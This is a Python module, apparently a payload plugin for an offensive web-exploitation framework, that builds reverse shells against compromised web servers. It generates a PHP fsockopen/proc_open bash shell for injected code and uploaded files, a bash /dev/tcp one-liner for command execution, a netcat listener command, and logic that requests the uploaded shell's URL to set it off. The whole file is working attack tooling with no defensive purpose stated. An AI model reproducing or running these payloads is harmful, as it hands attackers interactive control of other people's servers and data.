"""
HWP Payload — Reverse Shell

Spawns a reverse shell back to the attacker.

Delivery methods:
    RCE  — Execute reverse shell via PHP
    RCEs — Execute reverse shell via system command
    AFU  — Upload PHP reverse shell file

Note: RFI is not supported since the reverse shell PHP contains
dynamic lhost/lport values that can't be pre-hosted.

Options:
    --lhost     Listener IP
    --lport     Listener port (default: 4444)
"""

from hwp import Payload


class RevShell(Payload):
    name = "Reverse Shell"
    methods = ["RCE", "RCEs", "AFU"]
    description = "Spawn a reverse shell to your listener"
    options = [
        {"name": "lhost", "default": "", "help": "Listener IP", "required": True},
        {"name": "lport", "default": "4444", "help": "Listener port"},
    ]

    def instructions(self):
        lhost = self.options.get("lhost", "")
        lport = self.options.get("lport", "4444")

        if not lhost:
            self.error("LHOST is required")
            return []

        self.info(f"Reverse shell > {lhost}:{lport}")
        self.info(f"Start listener: nc -lvnp {lport}")

        if self.method == "RCE":
            php = (
                f"<?php "
                f"$sock=fsockopen('{lhost}',{lport});"
                f"$proc=proc_open('bash',array(0=>$sock,1=>$sock,2=>$sock),$pipes); "
                f"?>"
            )
            return [php]

        elif self.method == "RCEs":
            return [f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"]

        elif self.method == "AFU":
            php = (
                f"<?php "
                f"$sock=fsockopen('{lhost}',{lport});"
                f"$proc=proc_open('bash',array(0=>$sock,1=>$sock,2=>$sock),$pipes); "
                f"?>"
            )
            return [php]

    def report(self, results):
        for r in results:
            if r.success:
                self.success("Reverse shell payload delivered")
                if self.method in ("AFU", "RFI") and r.url:
                    self.info(f"Triggering: {r.url}")
                    try:
                        self.http.get(r.url, timeout=5)
                    except Exception:
                        pass  # Expected — PHP blocks when shell connects
